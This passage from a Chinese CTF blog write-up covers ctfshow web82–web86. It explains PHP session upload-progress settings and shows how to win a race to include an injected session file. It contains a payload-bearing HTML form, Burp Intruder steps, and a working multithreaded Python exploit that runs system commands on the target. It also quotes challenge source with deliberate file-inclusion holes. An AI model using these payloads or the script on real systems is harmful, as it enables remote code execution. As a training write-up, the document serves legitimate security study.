&lt;li&gt;✅ &lt;strong&gt;启用时：&lt;/strong&gt;&lt;br&gt;当客户端通过表单上传文件，并且表单里含有 &lt;code&gt;PHP_SESSION_UPLOAD_PROGRESS&lt;/code&gt; 字段时，&lt;br&gt; PHP 会自动把此次文件上传的详细信息(如上传时间、上传进度等)写入到对应的 &lt;code&gt;session&lt;/code&gt; 文件中。&lt;/li&gt;
&lt;li&gt;❌ &lt;strong&gt;关闭时：&lt;/strong&gt;&lt;br&gt;PHP 不会记录上传进度，即使你表单里加了 &lt;code&gt;PHP_SESSION_UPLOAD_PROGRESS&lt;/code&gt; 字段，也不会有任何效果。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;session.upload_progress.cleanup = On&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;📌 &lt;strong&gt;作用：&lt;/strong&gt;&lt;br&gt;控制 &lt;strong&gt;上传完成后，是否自动删除上传进度信息&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;✅ &lt;strong&gt;On（默认）：&lt;/strong&gt;&lt;br&gt;上传一完成，PHP 会&lt;strong&gt;自动清除 session 文件中那段上传进度内容&lt;/strong&gt;（包括你伪造的 &lt;code&gt;&amp;lt;?php ... ?&amp;gt;&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;也就是说，恶意内容会在上传后很快被删掉，&lt;strong&gt;留给攻击者操作的窗口非常短&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;❌ &lt;strong&gt;Off：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上传完成后，上传进度内容会一直保留在 &lt;code&gt;session&lt;/code&gt; 文件中，直到这个 &lt;code&gt;session&lt;/code&gt; 超时或被手动清理。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;📌 &lt;strong&gt;作用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设置写入 &lt;code&gt;session&lt;/code&gt; 文件时的 key 前缀。&lt;br&gt;默认是 &lt;code&gt;&amp;quot;upload_progress_&amp;quot;&lt;/code&gt;，所以写入内容的键名是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;upload_progress_&amp;lt;随机值&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比如你上传时，如果设置了表单字段：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那最终写入 &lt;code&gt;session&lt;/code&gt; 文件的内容可能是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;upload_progress_1234|a:6:&amp;#123;
  &amp;quot;start&amp;quot;:...,
  &amp;quot;content&amp;quot;:&amp;quot;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;quot;,
  ...
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;📌 &lt;strong&gt;作用：&lt;/strong&gt;&lt;br&gt;指定 &lt;strong&gt;表单里用于传递上传进度追踪 ID 的字段名&lt;/strong&gt;。&lt;br&gt;默认是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;...&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个字段值就是上传 ID，也就是 &lt;code&gt;upload_progress_&amp;lt;这个值&amp;gt;&lt;/code&gt;。&lt;br&gt;如果你设置：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;session.upload_progress.name = &amp;quot;PROGRESS_ID&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那你就必须这样写：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PROGRESS_ID&amp;quot; value=&amp;quot;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;否则 PHP 就不会追踪这个上传进度了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;session.use_strict_mode = Off&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;📌 &lt;strong&gt;作用：&lt;/strong&gt;&lt;br&gt;控制 &lt;strong&gt;PHP 在创建 &lt;code&gt;session&lt;/code&gt; 时是否检查 &lt;code&gt;session ID&lt;/code&gt; 的有效性&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;假设设置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;session.use_strict_mode = Off
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后你请求网站时伪造了 &lt;code&gt;cookie&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;http&#34;&gt;Cookie: PHPSESSID=love
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但服务器上 &lt;code&gt;/tmp/sess_love&lt;/code&gt; 文件根本不存在。&lt;/p&gt;
&lt;p&gt;✅ 如果 &lt;code&gt;strict_mode&lt;/code&gt; 是 &lt;code&gt;Off&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP 会 &lt;strong&gt;接受你伪造的 &lt;code&gt;session ID&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;并且 &lt;strong&gt;自动创建一个新的 &lt;code&gt;/tmp/sess_love&lt;/code&gt; 文件&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;攻击者就能指定 &lt;code&gt;session&lt;/code&gt; 文件的名字，配合题目中的 &lt;code&gt;include()&lt;/code&gt;，非常危险！&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;❌ 如果 &lt;code&gt;strict_mode&lt;/code&gt; 是 &lt;code&gt;On&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP 会发现你提交的 &lt;code&gt;session ID&lt;/code&gt;（如 &lt;code&gt;love&lt;/code&gt;）在服务器上不存在&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;拒绝使用这个伪造的 &lt;code&gt;session ID&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;会自动给你重新生成一个随机的合法 &lt;code&gt; session ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;你无法预测 &lt;code&gt;session&lt;/code&gt; 文件名，payload 也没法写进指定的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用 &lt;code&gt;POST.html&lt;/code&gt; 上传任意一个文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意在相应位置修改靶机地址和命令&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!-- 修改靶机地址 --&amp;gt;
&amp;lt;form action=&amp;quot;http://ca852e6a-5dde-48a7-995d-6e6fc0953fdb.challenge.ctf.show//&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
&amp;lt;!-- 修改命令 --&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;quot; /&amp;gt;
&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;?php
session_start();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;抓包后，在 &lt;code&gt;cookie&lt;/code&gt; 后添加 &lt;code&gt;PHPSESSID=love&lt;/code&gt;（ &lt;code&gt;PHPSESSID&lt;/code&gt; 的值任意）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如下示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Cookie: ccccooookkkkiiiieee; PHPSESSID=love
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804001653557.png&#34; alt=&#34;image-20250804001653557&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将抓到的包发送到 &lt;code&gt;Intruder&lt;/code&gt; 爆破模块，注意没有 &lt;code&gt;payload&lt;/code&gt; 插入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置 &lt;code&gt;Payload type&lt;/code&gt; 为 &lt;code&gt;Null payloads&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;勾选 &lt;code&gt;Continue indefinitely&lt;/code&gt; 无限重复&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804002512882.png&#34; alt=&#34;image-20250804002512882&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新建 &lt;code&gt;Resource pool&lt;/code&gt; 资源池，设置线程 &lt;code&gt;30&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Start attack&lt;/code&gt; 开始爆破，不断上传文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250805162000310.png&#34; alt=&#34;image-20250805162000310&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机?file=/tmp/sess_love&lt;/code&gt; 并抓包&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804002722557.png&#34; alt=&#34;image-20250804002722557&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同上（这里不需要对 &lt;code&gt;cookie&lt;/code&gt; 进行修改处理）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将抓到的包发送到 &lt;code&gt;Intruder&lt;/code&gt; 爆破模块，注意没有 &lt;code&gt;payload&lt;/code&gt; 插入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置 &lt;code&gt;Payload type&lt;/code&gt; 为 &lt;code&gt;Null payloads&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;勾选 &lt;code&gt;Continue indefinitely&lt;/code&gt; 无限重复&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804002512882.png&#34; alt=&#34;image-20250804002512882&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新建 &lt;code&gt;Resource pool&lt;/code&gt; 资源池，设置线程 &lt;code&gt;80&lt;/code&gt; (访问包的线程数需要大于上传包的线程数)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Start attack&lt;/code&gt; 开始爆破，不断访问文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250805162212020.png&#34; alt=&#34;image-20250805162212020&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看访问 &lt;code&gt;靶机?file=/tmp/sess_love&lt;/code&gt; 的包的爆破结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;根据 &lt;code&gt;Length&lt;/code&gt; 长度的不同找到命令的回显&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804005056379.png&#34; alt=&#34;image-20250804005056379&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250805161317653.png&#34; alt=&#34;image-20250805161317653&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250804005515129.png&#34; alt=&#34;image-20250804005515129&#34; style=&#34;zoom: 80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ctfshow82.py&lt;/code&gt; 多线程并发注入 + 读取 + 停止控制脚本（速度极快）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = &amp;#39;http://18f03190-5919-406c-a800-d21ef782a4ec.challenge.ctf.show/&amp;#39;

# === [2] 自定义参数 ===
PHPSESSID = &amp;#39;flag&amp;#39;
PAYLOAD = &amp;#39;&amp;lt;?php system(&amp;quot;cat fl0g.php&amp;quot;);?&amp;gt;mylove&amp;#39;   # 修改命令，自定义标识符
IDENTIFIER = &amp;#39;mylove&amp;#39;  # 用于判断是否成功执行
TARGET_SESS_PATH = &amp;#39;/tmp/sess_flag&amp;#39;  # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = &amp;#123;
        &amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;: PAYLOAD
    &amp;#125;

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b&amp;#39;A&amp;#39; * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies=&amp;#123;&amp;#39;PHPSESSID&amp;#39;: PHPSESSID&amp;#125;,
                data=data,
                files=&amp;#123;&amp;#39;file&amp;#39;: (f&amp;#39;upload_&amp;#123;thread_id&amp;#125;.txt&amp;#39;, fake_file)&amp;#125;,
                timeout=3
            )
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Upload OK&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f&amp;#39;&amp;#123;url&amp;#125;?file=&amp;#123;TARGET_SESS_PATH&amp;#125;&amp;#39;, timeout=2)   # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f&amp;#39;\n[+] [Read-&amp;#123;thread_id&amp;#125;] Payload executed successfully!\n&amp;#39;)
                print(response.text)
                found_flag.set()
                break
            else:
                print(f&amp;#39;[-] [Read-&amp;#123;thread_id&amp;#125;] Not ready&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Read-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print(&amp;quot;\n[+] Done. Exiting all threads.&amp;quot;)

# === [7] 执行入口 ===
if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807012753787.png&#34; alt=&#34;image-20250807012753787&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807012915867.png&#34; alt=&#34;image-20250807012915867&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web83&#34;&gt;&lt;a href=&#34;#web83&#34; class=&#34;headerlink&#34; title=&#34;web83&#34;&gt;&lt;/a&gt;web83&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14
&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:28:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_unset();
session_destroy();

if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);

    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;题解同web82&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807020107570.png&#34; alt=&#34;image-20250807020107570&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web84&#34;&gt;&lt;a href=&#34;#web84&#34; class=&#34;headerlink&#34; title=&#34;web84&#34;&gt;&lt;/a&gt;web84&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:40:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);
    system(&amp;quot;rm -rf /tmp/*&amp;quot;);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;rm -rf /tmp/*&lt;/code&gt; 强制递归地删除 &lt;code&gt;/tmp&lt;/code&gt; 目录下的所有文件和子目录。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;rm&lt;/code&gt;：删除文件或目录的命令。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-r&lt;/code&gt;：递归删除，表示如果是目录，则删除目录内所有内容。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-f&lt;/code&gt;：强制删除，不会提示确认。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;/tmp/*&lt;/code&gt;：&lt;code&gt;/tmp&lt;/code&gt; 目录下的所有文件和文件夹（&lt;code&gt;*&lt;/code&gt; 是通配符，匹配所有文件和目录）。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;其实 &lt;code&gt;session.upload_progress.cleanup = on&lt;/code&gt; 本身就会进行清空&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题解同web82&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（可通过降低上传线程、增大读取线程、降低&lt;code&gt;time.sleep&lt;/code&gt; 更快得到回显）&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807020302836.png&#34; alt=&#34;image-20250807020302836&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web85&#34;&gt;&lt;a href=&#34;#web85&#34; class=&#34;headerlink&#34; title=&#34;web85&#34;&gt;&lt;/a&gt;web85&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:59:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);
    if(file_exists($file))&amp;#123;
        $content = file_get_contents($file);
        if(strpos($content, &amp;quot;&amp;lt;&amp;quot;)&amp;gt;0)&amp;#123;
            die(&amp;quot;error&amp;quot;);
        &amp;#125;
        include($file);
    &amp;#125;

&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;增加&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if(file_exists($file))&amp;#123;
    $content = file_get_contents($file);
    if(strpos($content, &amp;quot;&amp;lt;&amp;quot;) &amp;gt; 0)&amp;#123;
        die(&amp;quot;error&amp;quot;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;if(file_exists($file))&amp;#123;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;判断变量 &lt;code&gt;$file&lt;/code&gt; 指定的文件是否存在。如果存在，进入代码块。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;$content = file_get_contents($file);&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;读取该文件的全部内容，赋值给 &lt;code&gt;$content&lt;/code&gt; 变量。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;if(strpos($content, &amp;quot;&amp;lt;&amp;quot;) &amp;gt; 0)&amp;#123;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;&lt;code&gt;strpos&lt;/code&gt; 是查找字符串中某个字符或子串首次出现的位置。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;这里查找字符串 &lt;code&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/code&gt;（小于号）在 &lt;code&gt;$content&lt;/code&gt; 中第一次出现的位置。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;返回值是数字（首次出现的下标），或者 &lt;code&gt;false&lt;/code&gt;（没找到）。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;这里用 &lt;code&gt;&amp;gt; 0&lt;/code&gt; 判断：表示只有当 &lt;code&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/code&gt; 出现在第1个及之后的位置时（下标大于0）才进入判断。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;注意，这里如果 &lt;code&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/code&gt; 出现在字符串开头（下标0），不会触发条件。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;die(&amp;quot;error&amp;quot;);&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;直接终止程序运行，输出 &lt;code&gt;error&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;依旧可以选择脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题解同web82&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250809001445881.png&#34; alt=&#34;image-20250809001445881&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250809001640338.png&#34; alt=&#34;image-20250809001640338&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web86&#34;&gt;&lt;a href=&#34;#web86&#34; class=&#34;headerlink&#34; title=&#34;web86&#34;&gt;&lt;/a&gt;web86&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:20:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
define(&amp;#39;还要秀？&amp;#39;, dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);


&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;define(&amp;#39;还要秀？&amp;#39;, dirname(__FILE__));&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;define&lt;/code&gt; 是 PHP 定义常量的函数，第一个参数是常量名（字符串），第二个参数是常量值。&lt;/li&gt;
&lt;li&gt;这里定义了一个名为 &lt;code&gt;&amp;#39;还要秀？&amp;#39;&lt;/code&gt; 的常量（中文名常量是允许的，只要符合 PHP 标识符规范就行，但中文名一般不推荐）。&lt;/li&gt;
